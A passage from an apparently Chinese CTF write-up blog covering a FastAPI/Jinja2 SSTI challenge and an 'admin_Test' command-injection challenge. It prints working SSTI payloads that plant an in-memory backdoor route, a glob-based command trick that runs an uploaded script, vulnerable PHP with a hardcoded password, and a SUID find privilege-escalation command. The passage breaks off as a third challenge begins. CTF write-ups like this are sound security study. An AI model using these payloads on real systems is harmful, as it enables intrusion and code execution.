punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>        <span class="token keyword">return</span> wrapper    <span class="token keyword">return</span> decorator    app <span class="token operator">=</span> FastAPI<span class="token punctuation">(</span><span class="token punctuation">)</span>access <span class="token operator">=</span> <span class="token boolean">False</span>_base_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span>t <span class="token operator">=</span> Jinja2Templates<span class="token punctuation">(</span>directory<span class="token operator">=</span>_base_path<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>get</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@timeout_after</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>get</span><span class="token punctuation">(</span><span class="token string">"/calc"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@timeout_after</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">ssti</span><span class="token punctuation">(</span>calc_req<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> access    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">any</span><span class="token punctuation">(</span>char<span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> char <span class="token keyword">in</span> calc_req<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token string">"%"</span> <span class="token keyword">in</span> calc_req<span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">not</span> calc_req<span class="token punctuation">.</span>isascii<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">or</span> access<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"bad char"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        jinja2<span class="token punctuation">.</span>Environment<span class="token punctuation">(</span>loader<span class="token operator">=</span>jinja2<span class="token punctuation">.</span>BaseLoader<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>from_string<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"&#123;&#123;&#123;&#123; </span><span class="token interpolation"><span class="token punctuation">&#123;</span>calc_req<span class="token punctuation">&#125;</span></span><span class="token string"> &#125;&#125;&#125;&#125;"</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"app"</span><span class="token punctuation">:</span> app<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        access <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token string">"fight"</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    uvicorn<span class="token punctuation">.</span>run<span class="token punctuation">(</span>app<span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问openapi.json获得接口列表</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"openapi"</span><span class="token operator">:</span> <span class="token string">"3.1.0"</span><span class="token punctuation">,</span>  <span class="token property">"info"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"FastAPI"</span><span class="token punctuation">,</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.1.0"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"paths"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"/"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Index"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"index__get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/calc"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Ssti"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"ssti_calc_get"</span><span class="token punctuation">,</span>        <span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"calc_req"</span><span class="token punctuation">,</span>            <span class="token property">"in"</span><span class="token operator">:</span> <span class="token string">"query"</span><span class="token punctuation">,</span>            <span class="token property">"required"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>            <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>              <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Calc Req"</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"422"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Validation Error"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                  <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"#/components/schemas/HTTPValidationError"</span>                <span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"components"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"schemas"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"HTTPValidationError"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"properties"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"detail"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"items"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"#/components/schemas/ValidationError"</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"array"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Detail"</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"object"</span><span class="token punctuation">,</span>        <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"HTTPValidationError"</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token property">"ValidationError"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"properties"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"loc"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"items"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"anyOf"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token punctuation">&#123;</span>                  <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token punctuation">&#123;</span>                  <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"integer"</span>                <span class="token punctuation">&#125;</span>              <span class="token punctuation">]</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"array"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Location"</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"msg"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Message"</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"type"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Error Type"</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"object"</span><span class="token punctuation">,</span>        <span class="token property">"required"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token string">"loc"</span><span class="token punctuation">,</span>          <span class="token string">"msg"</span><span class="token punctuation">,</span>          <span class="token string">"type"</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"ValidationError"</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>定义了这几个api路径：</p><p><code>/</code>：根路径，get方法</p><p><code>/calc</code>：ssti，参数calc_req</p><p>那就很明显是要ssti了，参考<a href="https://medium.com/dsf-developers/how-to-handle-an-ssti-vulnerability-in-jinja2-58242e561d4f">https://medium.com/dsf-developers/how-to-handle-an-ssti-vulnerability-in-jinja2-58242e561d4f</a></p><p>但是这里的waf：<code>if (any(char.isdigit() for char in calc_req)) or (&quot;%&quot; in calc_req) or not calc_req.isascii() or access</code></p><ul><li>检查<code>calc_req</code>中是否包含数字字符</li><li>检查<code>calc_req</code>中是否包含<code>%</code>字符</li><li>检查<code>calc_req</code>中的字符是否不是ASCII字符</li><li>检查全局变量<code>access</code>是否为真</li></ul><p>影响不大，本地测试的payload</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">self<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">.</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'calc'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>能弹计算器</p><p>接下来由于ban掉了数字，不好弹shell，应该是要打内存马，在fastapi的依赖中找到<code>add_api_route</code>这个方法，然后构造我们的匿名函数（也就是对应了题目描述的“举一反三”，诶前两天刚学的flask内存马这就派上用场了）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">self<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"app.add_api_route('/cmd',lambda+:__import__('os').popen('calc').read())"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">"app"</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'sys'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最终的payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">self<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"app.add_api_route('/cmd',lambda+:__import__('os').popen('cat$&#123;IFS&#125;/flag').read())"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">"app"</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'sys'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/image-20240817150617706.png" alt="image-20240817150617706"></p><p><img src="/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/image-20240817150637519.png" alt="image-20240817150637519"></p><hr><h1 id="admin-Test"><a href="#admin-Test" class="headerlink" title="admin_Test"></a>admin_Test</h1><blockquote><p>linux命令构造 + find提权</p></blockquote><p>dirsearch扫，直接扫出admin.html，进去发现是个文件上传接口</p><p><img src="/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/image-20240817123229604.png" alt="image-20240817123229604"></p><p>fuzz了一下发现只有t，<code>/</code>，<code>.</code>，<code>*</code>和空格不会被ban</p><p>接下来凑命令执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/*<span class="token comment"># bin目录</span>/*/*<span class="token comment"># [</span>/*/t*<span class="token comment"># tabs</span>/*/*t<span class="token comment"># addpart</span>/t*<span class="token comment"># tmp目录</span>/*t<span class="token comment"># boot目录</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>找不到啥有用的命令，但是注意到给了个文件上传肯定不是白给的，猜测文件只是传到了&#x2F;tmp下</p><p>于是尝试上传sh脚本并执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">.</span> /t*/*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/image-20240817164731624.png" alt="image-20240817164731624"></p><p>upload.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$target_dir</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"uploads/"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$target_dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$target_dir</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$random_name</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$target_file</span> <span class="token operator">=</span> <span class="token variable">$target_dir</span> <span class="token operator">.</span> <span class="token variable">$random_name</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"upload successfully&lt;br>"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"upload error, but you can try another way&lt;br>"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[\.\/\*t ]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre><span class="token interpolation"><span class="token variable">$output</span></span>&lt;/pre>"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Invalid char"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'reset'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'reset'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'true'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$tmp_dir</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/tmp/'</span><span class="token punctuation">;</span>        <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">glob</span><span class="token punctuation">(</span><span class="token variable">$tmp_dir</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"环境已重置"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>login.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$valid_username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span>    <span class="token variable">$valid_password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'qwe123!@#'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">===</span> <span class="token variable">$valid_username</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">===</span> <span class="token variable">$valid_password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'loggedin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: admin.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;script>alert("Invalid username or password.");window.location.href="index.html";&lt;/script>'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: index.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿着这个账密登录，没啥用</p><p>那就回来提权</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以find提权</p><p><img src="/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/image-20240817165701220.png" alt="image-20240817165701220"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-exec</span> /bin/sh <span class="token parameter variable">-pc</span> <span class="token string">"cat /flag"</span> <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token parameter variable">-quit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/image-20240817165850641.png" alt="image-20240817165850641"></p><hr><h1 id="php-online（复现）"><a href="#php-online（复现）" class="headerlink" title="php_online（复现）"></a>php_online（复现）</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token 